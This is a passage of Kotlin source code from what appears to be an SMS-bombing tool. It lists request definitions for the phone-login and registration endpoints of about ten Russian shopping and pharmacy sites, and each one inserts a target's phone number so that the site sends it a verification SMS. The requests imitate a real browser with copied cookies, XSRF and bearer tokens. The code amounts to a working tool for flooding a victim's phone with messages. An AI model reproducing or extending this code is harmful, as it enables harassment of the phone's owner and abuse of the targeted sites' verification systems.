location=eyJpdiI6IjRqSk5qSWY0MnN2dG0rRFQ2MlU1U0E9PSIsInZhbHVlIjoiTkkveFZYV3lxOVB0VGd3K1ByTks4WmJVeisxQzhNdnRVZk1oMlQ4N2xKaG1zUDF3UnIzVWlRMEgvZEl6bktUWTBjYnlrODZ3eHQzWWNxN0lCaWJMSTRiQzlvbXlZTzMzaGpGWEVuUUx0dGc9IiwibWFjIjoiZTc5NzExMDA1ZWZjYzgyYzBmZWJmZGFjNTM5MmQxZGE2N2EzMzYyNzQ1NmNlNzJjMzFmMTU1NjA3OTI2YzE3MiIsInRhZyI6IiJ9; cart=eyJpdiI6Im5hbjBxRjdSS1BMUHJxb1dkVFRERkE9PSIsInZhbHVlIjoicVFsek45Nkd6OFd6OFN4S1BoYndYRk4yOFBzTXgzUysrYkJJWjNzakxMVHNyQmlQcTFtZ2NGdTA2U3FKUDJkS2hveTJXSXRJZHZrVmRpSGV4dlphbld3UzZIWGNpMW5Eei9CL08rd0xDSmM9IiwibWFjIjoiMGM0N2MzMjg4ZGNiZDVlMTg0ZDY1MWI1NmE5YTRiMTQxMmY3NmM1ZGQ1Y2FhNTEwZGE2MjExNjM0YjRkOGJkMyIsInRhZyI6IiJ9; __cf_bm=4yyICiip2AF_.DMgWRnxj7UjH8WvTK8zDFnFNrETz8s-1692792774-0-AWUFnMVW7aGhPSlkkFgcVXgOcZ/4d15LWCYq+RqvRUULfeikDxfCDFlV9FFSWJKy13hgliBu4E/8yVwoS9dUmAY=; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; cf_clearance=RB9uhpq6L56uLuZNVMYzu.GTYUl9ywsGBM9XhOX0Vu8-1692792775-0-1-e415241b.fa085fe3.b3147bfb-0.2.1692792775; _ga=GA1.2.1939773885.1692792775; _gid=GA1.2.1753136878.1692792775; _gat=1; tmr_lvid=b15e6f1f4b5439c9fca9e2e8d1836f65; tmr_lvidTS=1692792774904; _ym_uid=1692792775347121388; _ym_d=1692792775; _ym_isad=2; _ym_visorc=w; _ga_7J0T2DHK9N=GS1.2.1692792775.1.0.1692792775.0.0.0; tmr_detect=0%7C1692792777734"
            )
            add("origin", "https://farmakopeika.ru")
            add("referer", "https://farmakopeika.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
            add(
                "x-xsrf-token",
                "eyJpdiI6Ik94ditKT25oMm55QkRTTlRvUWkvWFE9PSIsInZhbHVlIjoiN1hhMkRwaHlOY2F2cGh3blJaQi90SlowZWxxTEs0U0lFYWZiT2lreVNpTkc2N3FJajlhdWdaNitsbTlBVmpMQUIzODlTOUNJZUVxMVVJMGN1V1RvejVIamZmUjdWdkxKZFNLeC9teE5pS2dJUkN0ZVN1RU5XK3laUGZPbDU2NlMiLCJtYWMiOiI2NDBiMzJiMDgwYWQzYWNjNTM2ZGE5NWY3Y2VkYzYxN2Q5NTYyNTE5ZTYyNzhiZjUyYTlhMjY3Yjk4M2IxOTI5IiwidGFnIjoiIn0="
            )
        }

        json("{\"phone\":\"${phone.phone}\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://klassika-apteka.ru/ajax/check_phone.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            add("Accept", "*/*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "PHPSESSID=azGRyOlkN1O6STHHtQtgloo4cEkWEkLW; BITRIX_SM_SALE_UID=78521009; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1692817140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ga=GA1.2.1630841146.1692792956; _gid=GA1.2.1529823947.1692792956; _gat=1; _ym_uid=169279295764722878; _ym_d=1692792957; _ym_isad=2; _ym_visorc=w; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; BITRIX_SM_current_city=114359; BITRIX_SM_current_store=171; _ga_XSTHQYP730=GS1.2.1692792956.1.1.1692792960.0.0.0"
            )
            add("Origin", "https://klassika-apteka.ru")
            add("Referer", "https://klassika-apteka.ru/auth/")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("X-Requested-With", "XMLHttpRequest")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        formBody {
            add("phone", phone.format("+7 (***) ***-**-**"))
            add("action", "sendMessage")
        }
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://polza.ru/ajax/auth_json.php") {
            addQueryParameter("login", "y")
        }

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "polza.ru")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "multipart/form-data; boundary=----WebKitFormBoundaryokolorLqVWmXt2f6")
            add(
                "cookie",
                "PHPSESSID=2q3lkacos4olp126bpqba39767; BITRIX_SM_SALE_UID=ee0588f0c54d30f30ffe72f40e26a614; _ym_uid=1692796841995589721; _ym_d=1692796841; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1692824340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; tmr_lvid=7861b054d462cdb165d6f4a400f91607; tmr_lvidTS=1692796840730; _ga=GA1.2.785578857.1692796840; _gid=GA1.2.695720243.1692796841; _gat_UA-185123854-1=1; _ym_isad=2; _ym_visorc=b; _ymab_param=FKCd8W-Vt6y-67co3D_o4RcJEaMbHatLOuYb0OGDiyNb8sLxyz17ldWfmT69MkwFW3wOcoPTe_V_CV10bPfrBNg-LCo; _ga_C34KBLMXDC=GS1.1.1692796840.1.0.1692796841.59.0.0; tmr_detect=0%7C1692796843380"
            )
            add("origin", "https://polza.ru")
            add("referer", "https://polza.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        multipart("----WebKitFormBoundaryokolorLqVWmXt2f6") {
            addFormDataPart("USER_PHONE_NUMBER", phone.format("+7 (***) ***-**-**"))
            addFormDataPart("USER_REMEMBER", "Y")
            addFormDataPart("AUTH_FORM", "Y")
            addFormDataPart("POPUP_AUTH", "Y")
            addFormDataPart("TYPE", "AUTH")
            addFormDataPart("Login", "Y")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://galamart.ru/cms"

        headers {
            add("Content-Type", "application/json")
            add("authority", "galamart.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json;charset=UTF-8")
            add(
                "cookie",
                "gm_city_id=2763c110-cb8b-416a-9dac-ad28a55b4402; cms_gm=474d0009-4288-4c46-a1e2-196eb27c1525; mgo_uid=2IIGk9JgwnRGKW9DkdYZ; _ga_GF313L6X2M=GS1.1.1692797515.1.0.1692797515.0.0.0; _ga=GA1.1.84251525.1692797515; _ym_uid=1692797516834801187; _ym_d=1692797516; _ym_isad=2; _ym_visorc=w"
            )
            add("origin", "https://galamart.ru")
            add("referer", "https://galamart.ru/profile/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        json("{\"method\":\"customer.login\",\"params\":{\"login\":\"+$phone\",\"profile\":{\"deviceUUID\":\"cc53bf2b-dc7b-5936-b8fa-6a37319e719e\",\"analytics\":{\"create_url\":\"https://galamart.ru/profile/\"}}}}")
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://ekonika.ru/ajax/send_pin.php") {
            addQueryParameter("site", "s1")
            addQueryParameter("type", "login.web")
        }

        headers {
            add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            add("Accept", "*/*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "qrator_jsr=1692797922.738.dxskAzSo0QclNBiL-v2488akq58l2p5gq56alojodija8s37a-00; qrator_ssid=1692797923.139.ETs9F7CDKuUFR4hw-i0ajmi0qjrdr424ia52fag444m2v2rbl; qrator_jsid=1692797922.738.dxskAzSo0QclNBiL-in7cqofcspu2l41jhtjl7l0m1qbu5lsm; PHPSESSID=mcf0bus6pc39kprkn5nco9p8qr; CURRENT_LOCATION_ID=84; BITRIX_SM_SALE_UID=239027686; _gcl_au=1.1.1000483418.1692797923; flocktory-uuid=e7198df5-2617-482e-88c7-dfac2c96332b-8; adtech_uid=2576f368-d044-4267-a59f-7c586178e469%3Aekonika.ru; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1692824340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; top100_id=t1.7643190.1448761831.1692797923421; last_visit=1692787123428%3A%3A1692797923428; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; tmr_lvid=ad149e22569eab5a282c8839f8aef5c6; tmr_lvidTS=1692797923452; _userGUID=0:llns6da9:p8SbR3RHywpJJjZjXLsBgfN6GB5kFl2v; dSesn=b2c6527a-b8f9-48f5-7233-02288c5d8a5c; _dvs=0:llns6da9:PxjLBrFI7kzlxa9sBpyjbijxAfJtOIWw; _ym_uid=1692797924547337160; _ym_d=1692797924; t3_sid_7643190=s1.1785129951.1692797923425.1692797924159.1.2; _ga_7NNZ59QE8F=GS1.1.1692797924.1.0.1692797924.60.0.0; _ga=GA1.2.1953489920.1692797924; _gid=GA1.2.1002498706.1692797924; _ym_isad=2; _ym_visorc=b; _dc_gtm_UA-8859472-12=1; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; adrdel=1; adrcid=ATMqqPeNBurPgrg37mfKukw; tmr_detect=0%7C1692797926286"
            )
            add("Origin", "https://ekonika.ru")
            add("Referer", "https://ekonika.ru/?utm_referrer=https%3A%2F%2Fwww.google.com%2F")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("X-Requested-With", "XMLHttpRequest")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        formBody {
            add("code", "+7")
            add("phone", phone.format("***-***-**-**"))
            add("action", "check_phone")
            add("sessid", "fb7d1c9c430ba5bac198dae0bfb555c3")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://profi.ru/graphql"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "profi.ru")
            add("accept", "application/json")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json")
            add(
                "cookie",
                "city=msk; site_version=desktop; first_hit_url=%2Fcabinet%2Flogin%2F; uid=8DBABAB9C60CE664E713D79702EF8609; sid=ubq6jWTmDMaX1xPnCYbvAg==; ets=%2Fcabinet%2Flogin%2F%2C%2C1692798151; _ym_uid=169279815075233336; _ym_d=1692798150; _gcl_au=1.1.1741996197.1692798150; advcake_track_id=9396b886-f07a-f86e-8b51-7987eff99ef8; advcake_session_id=434d5f95-6b05-c4a6-9e3e-fc7f169348b3; _ym_isad=2; prfr_tkn=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiZnVsbCIsInZlcnNpb24iOjEsImlkIjoiYmUzY2FjYWUtMDI0YS00MmU1LWE4Y2YtNTliMzg1MjI3N2ViIiwic3RhdHVzIjoidG91Y2hlZCIsInNlc3Npb25JZCI6IjkwMzc5ZWIzLTQwMDEtNDRmNS04NjRkLTQxYmQ3MGJlNjFhMCIsImlhdCI6MTY5Mjc5ODE1MSwiZXhwIjoxNjkyNzk4NzUxLCJqdGkiOiJiZTNjYWNhZS0wMjRhLTQyZTUtYThjZi01OWIzODUyMjc3ZWIifQ.x0TQlbV3kvV2dFWXXpz3MxiG2fGlagddE0evX5WvVW8; _ga_FRVD1KH7N7=GS1.1.1692798150.1.0.1692798150.60.0.0; tmr_lvid=b317bb09f81d6dceefd3e74fb36e2132; tmr_lvidTS=1692798150607; _ga=GA1.2.1284106746.1692798151; _gid=GA1.2.1852101639.1692798151; _gat_UA-51788549-1=1; _ga_E5EFDDJNYL=GS1.2.1692798150.1.0.1692798150.60.0.0; _tt_enable_cookie=1; _ttp=BK4ol9a1WtQ4RpJLEtHBtxRjsmb; tmr_detect=0%7C1692798152956"
            )
            add("origin", "https://profi.ru")
            add("referer", "https://profi.ru/cabinet/login/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-app-id", "PROFI")
            add("x-new-auth-compatible", "1")
            add("x-requested-with", "XMLHttpRequest")
            add("x-wtf-id", "1250279-1692798150.647-188.159.98.143-64912")
        }

        json(
            "{\"query\":\"#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\\nquery authStrategyStart(\$type: AuthStrategyType!, \$initialState: AuthStrategyInitialState!) {\\n  authStrategyStart(type: \$type, initialState: \$initialState) {\\n    ...AuthStrategyUseResultFragment\\n  }\\n}\\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\\n  strategy {\\n    strategyDescriptor\\n    stepDescriptor\\n    name\\n    type\\n  }\\n  result {\\n    __typename\\n    ... on AuthStrategyResultRetry {\\n      answer {\\n        __typename\\n        errors {\\n          __typename\\n          code\\n          message\\n          param\\n        }\\n      }\\n    }\\n    ... on AuthStrategyResultError {\\n      answer {\\n        __typename\\n        errors {\\n          __typename\\n          code\\n          message\\n          param\\n        }\\n      }\\n    }\\n    ... on AuthStrategyResultSuccess {\\n      __typename\\n      answer {\\n        __typename\\n        events {\\n          __typename\\n          ... on AuthStrategyIAnalyticEvent {\\n            type\\n          }\\n        }\\n      }\\n      auth {\\n        loginUrl\\n      }\\n      step {\\n        __typename\\n        stepId\\n        title\\n        ... on AuthStrategyStepFillPhone {\\n          phoneSuggestion\\n        }\\n        ... on AuthStrategyStepValidateMobileId {\\n          phoneNumber\\n          resendDelay\\n        }\\n        ... on AuthStrategyStepValidatePincode {\\n          phoneNumber\\n          resendDelay\\n        }\\n        ... on AuthStrategyStepFillUserInfo {\\n          requestedFields {\\n            __typename\\n            fieldId\\n            type\\n            required\\n            suggestedValue\\n          }\\n        }\\n        ... on AuthStrategyStepRequestSocNet {\\n          socNetId\\n          oAuthStateToken\\n          popupUrl\\n          windowWidth\\n          windowHeight\\n        }\\n        ... on AuthStrategyStepRequestYandex {\\n          appId\\n          scopes\\n        }\\n      }\\n    }\\n  }\\n}\",\"variables\":{\"type\":\"phone\",\"initialState\":{\"phoneNumber\":\"${
                phone.format(
                    "7 ***-***-**-**"
                )
            }\",\"defaultOrderCityId\":\"prfr\",\"currentHost\":\"https://profi.ru\"}}}"
        )
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://www.bethowen.ru/api/local/v1/users/authorization/code"

        headers {
            add("Content-Type", "application/json")
            add("authority", "www.bethowen.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json; charset=utf-8")
            add(
                "cookie",
                "PHPSESSID=o84dcose885pmebvotd9poegjc; BETHOWEN_GEO_TOWN=%D0%9C%D1%83%D1%80%D0%BE%D0%BC; BETHOWEN_GEO_TOWN_ID=77177; BETHOWEN_GEO_REGION_ID=18; BETHOWEN_GEO_REGION=%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BC%D0%B8%D1%80%D1%81%D0%BA%D0%B0%D1%8F; IS_AUTHORIZED_USER=N; BITRIX_SM_SALE_UID=3fb8f9f22fa31fab20833c5099d3f40e; flocktory-uuid=388eddff-13f2-4bf9-a110-1d1b0e8cef6c-6; _ga_XV397Q6BXS=GS1.1.1692799025.1.0.1692799025.60.0.0; _ga=GA1.2.1202447831.1692799025; _gid=GA1.2.2092867458.1692799025; _gat_UA-74359728-1=1; _userGUID=0:llnstzd6:EXkKUavZGuAy3obfA61Vd8IuSUkXO6e5; dSesn=767eaffc-e5e9-dac9-c3bd-689873c99301; _dvs=0:llnstzd6:Gsu0gnwXLjIvqOfaO77wF8zBwLarAD~2; tmr_lvid=dc56dcc4c8a19457e1c6d9b403fd31fb; tmr_lvidTS=1692799025246; _ym_uid=1692799026421961513; _ym_d=1692799026; _gcl_au=1.1.325676645.1692799026; _ym_visorc=w; _ym_debug=null; _ym_isad=2; user_unic_ac_id=ad30eb62-9403-705c-db5d-1f0932070424; advcake_session=1; _gat_gtag_UA_74359728_1=1; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=69a3d474-8b1e-42ac-97ef-4f5337e6ed1b; cto_bundle=TyJI5V8ycEpZbDdtSnAzc0tXVlVtcG52TkZYWWM1WElUbXBOV2dKZHduQWVmN29NTEZ4RnhEajRaQ2NvNmJBV09qQjklMkZmRnV0Y0NyOHlQa0RYdEJMcnFsVjV3Y2lpWWloSEV2b281dVRLSHV6SmUwcHJJdlJxYVJDOHF4Z09Gd05raWh4Q1ElMkZwY1FqN3EyVlNlSjlpdyUyQnNxOFElM0QlM0Q; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; tmr_detect=0%7C1692799028791; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; _ga_DD0749TTTB=GS1.1.1692799024.1.1.1692799051.33.0.0; activity=7|20"
            )
            add("origin", "https://www.bethowen.ru")
            add("referer", "https://www.bethowen.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        json("{\"type\":\"phone\",\"login\":\"8${phone.phone}\"}")
    },

    service(7) {
        url("https://05.ru/api/v1/oauth/code/send/${phone.format("+7(***)***-**-**")}") {
            addQueryParameter("short", "true")
        }

        headers {
            add("authority", "05.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("authorization", "Bearer 19620823-41bf-11ee-acdb-12c0bc664a05")
            add(
                "cookie",
                "ABOT=ab714042d68d3df9444e580c64f979e4; nuxt-vue-store=%7B%22user%22%3A%7B%22data%22%3Anull%7D%2C%22location%22%3A%7B%7D%2C%22bonus%22%3A%7B%7D%2C%22token%22%3A%7B%22accessToken%22%3A%7B%22value%22%3A%2219620823-41bf-11ee-acdb-12c0bc664a05%22%2C%22expire%22%3A1695391951%7D%2C%22refreshToken%22%3A%7B%22value%22%3A%22196246b4-41bf-11ee-acdb-12c0bc664a05%22%2C%22expire%22%3A1695391951%7D%7D%7D; user-lists=%7B%22userLists%22%3A%7B%22user%22%3A%7B%22compare%22%3A%7B%7D%2C%22favorite%22%3A%7B%7D%7D%2C%22guest%22%3A%7B%22compare%22%3A%7B%7D%2C%22favorite%22%3A%7B%7D%7D%7D%7D; exp-checkoutAccessories=74Y4ltU_T_iyvWZbmTdHSg.1; exp-checkoutExpressDelivery=%20_OiJcqAYRqWyHEQPiBlRcg.0; SERV=vue1; showAppPromo=false; _ym_uid=1692799952635338614; _ym_d=1692799952; location=%7B%22currentCity%22%3A%7B%22id%22%3A1359%2C%22code%22%3A%220000495241%22%2C%22name%22%3A%22%D0%9C%D0%B0%D1%85%D0%B0%D1%87%D0%BA%D0%B0%D0%BB%D0%B0%22%2C%22lat%22%3A42.983024%2C%22lon%22%3A47.504872%2C%22region%22%3A%7B%22id%22%3A37%2C%22name%22%3A%22%D0%A0%D0%B5%D1%81%D0%BF%D1%83%D0%B1%D0%BB%D0%B8%D0%BA%D0%B0%20%D0%94%D0%B0%D0%B3%D0%B5%D1%81%D1%82%D0%B0%D0%BD%22%7D%7D%2C%22confirmed%22%3Afalse%7D; cto_bundle=5URNnV8ycEpZbDdtSnAzc0tXVlVtcG52TkZVS08xJTJCaFR3RHlmR1RrbktIcTZiTzY2YXlIcFZnQUlYY0wlMkJmWWNWUTJHWiUyQjVXUEJZbmFFa0JqcmgwODRXdTVwWGFHRXlYREFkRE01bUVqYTJKNnVtbW1SQTQ2d00yMldUQWk0MG1WWFZuY2pzOTlwJTJCTkVRaE9pSjNCRVZzMjhhUSUzRCUzRA; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; _ym_isad=2; _ym_visorc=w; _gcl_au=1.1.2110306853.1692799953; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-08-23%2017%3A12%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2F05.ru%2Fuser%2F%7C%7C%7Crf%3Dhttps%3A%2F%2F05.ru%2Fuser%2F; sbjs_first_add=fd%3D2023-08-23%2017%3A12%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2F05.ru%2Fuser%2F%7C%7C%7Crf%3Dhttps%3A%2F%2F05.ru%2Fuser%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F115.0.0.0%20Safari%2F537.36%20Edg%2F115.0.1901.203; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2F05.ru%2Fuser%2F; pageviewCount=1; _ga_LB6GGH4SWD=GS1.1.1692799954.1.0.1692799954.0.0.0; _ga=GA1.1.1803594378.1692799954; _ga_CRVSX4RVFF=GS1.1.1692799954.1.0.1692799954.60.0.0; tmr_lvid=abef70e2759d444379092535d1bdfd8b; tmr_lvidTS=1692799954126; _userGUID=0:llntdw5n:roiSL9ibZTJL1EEp~nK3v6RuKqZCg0sc; dSesn=c1c05d45-437d-541b-369b-4bd1ddc2c982; _dvs=0:llntdw5n:DwLOwl2Xh_k9HoSnV_lI54DZsXSCsosV; _ymab_param=wbjjJyhG92R5ckByaa912AmurVQ6ZOKuS65tAB2rsKSwXwdcvRaBZfVsxUT5U86TNAxRgIwjJMIuCyLc7xj6veCR1IQ; ct_static_user_id=203788; __utmz=utmcsr%3D(direct)%7Cctd%7Cutmccn%3D(not%20set)%7Cctd%7Cutmcmd%3D(none)%7Cctd%7Cutmctr%3D-%7Cctd%7Cutmcct%3D-%7Cctd%7Creferrer%3Dhttp%3A%2F%2F05.ru%2F%7Cctd%7Clanding%3Dhttps%25253A%2F%2F05.ru%2Fuser%2F; __imz=utmcsr%3D(direct)%7Cctd%7Cutmccn%3D(not%20set)%7Cctd%7Cutmcmd%3D(none)%7Cctd%7Cutmctr%3D-%7Cctd%7Cutmcct%3D-%7Cctd%7Creferrer%3Dhttp%3A%2F%2F05.ru%2F%7Cctd%7Clanding%3Dhttps%25253A%2F%2F05.ru%2Fuser%2F; ct_url_metrics=%7B%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; tmr_detect=0%7C1692799956499; _ga_LNHY0NP1WJ=GS1.1.1692799954.1.0.1692799968.46.0.0"
            )
            add("device-uuid", "b5025119-1451-4b77-bc8a-7b0986de9ce7")
            add("referer", "https://05.ru/user/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://4lapy.ru/ajax/confirmation/phone/send-code"

        headers {
            add("Content-Type", "application/json")
            add("authority", "4lapy.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json;charset=utf-8")
            add(
                "cookie",
                "PHPSESSID=qul0016f91t34a75sgllp6ghc8; 4LP_SALE_UID=2515952449; rrpvid=582709359608772; skipCache=0; _gcl_au=1.1.1204040883.1692800319; cancel_mobile_app=0; show_mobile_app=1; testcookie=e0a5fe5fe86ada300005a1978e97b378493ad3f; rcuid=64bff15d833c6767f1bdb21e; _gid=GA1.2.659608212.1692800320; _gat=1; _gat_UA-229621277-1=1; _userGUID=0:llntlqm2:0CCeSmZJXOsYc95yywqZcn8ps0mAncNo; tmr_lvid=88157dc0fa3f73802c617ff925b7cc6f; tmr_lvidTS=1692800320339; flocktory-uuid=806e73cc-95cd-4477-8998-e5b314c8662e-8; _ym_uid=16928003209386179; _ym_d=1692800320; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; __exponea_etc__=9feb0471-e134-4afe-8cae-b516edee8e72; __exponea_time2__=0.5466020107269287; _ymab_param=FtOmMZtXZaybcM1DBYjlGMpJbOnx_cWqEdk8EimqjYjAtajQ7Z0b0lkyT_akI9kaWOPodTB7cX93-fRbbmwSV9v8vjc; _ym_isad=2; adrdel=1; adrcid=AyMp8-qkzirZcrbze22r9rA; _gpVisits={\"isFirstVisitDomain\":true,\"idContainer\":\"1000259C\"}; _gat_UA-30730607-1=1; user_geo_location=%5B%5D; _ga=GA1.2.818235092.1692800320; _ga_C98WC28BDH=GS1.2.1692800321.1.1.1692800327.54.0.0; _gp1000259C={\"hits\":2,\"vc\":1,\"ac\":1,\"a6\":1}; _ga_GRN90Z74D3=GS1.1.1692800319.1.1.1692800328.51.0.0; tmr_detect=0%7C1692800329709"
            )
            add(
                "newrelic",
                "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM0NTMzODkiLCJhcCI6IjMyODAxMDM4MyIsImlkIjoiYjBjOTA4OTc1YmQyYzg5NyIsInRyIjoiMWYwM2Q0MzY5MTA0YzE2Y2Y0OGJkZjc3YTViMzBiMDAiLCJ0aSI6MTY5MjgwMDM0MjI3OX19"
            )
            add("origin", "https://4lapy.ru")
            add(
                "referer",
                "https://4lapy.ru/personal/register/?backurl=https%3A%2F%2F4lapy.ru%2Fpersonal%2Fregister%2F%3Fbackurl%3Dhttps%3A%2F%2F4lapy.ru%2F"
            )
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("traceparent", "00-1f03d4369104c16cf48bdf77a5b30b00-b0c908975bd2c897-01")
            add("tracestate", "3453389@nr=0-1-3453389-328010383-b0c908975bd2c897----1692800342279")
        }

        json("{\"form_type\":\"form_registration_on_site\",\"phone\":\"${phone.format("+7 (***) ***-**-**")}\",\"resend\":false}")
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://my-shop.ru/cgi-bin/my_util2.pl") {
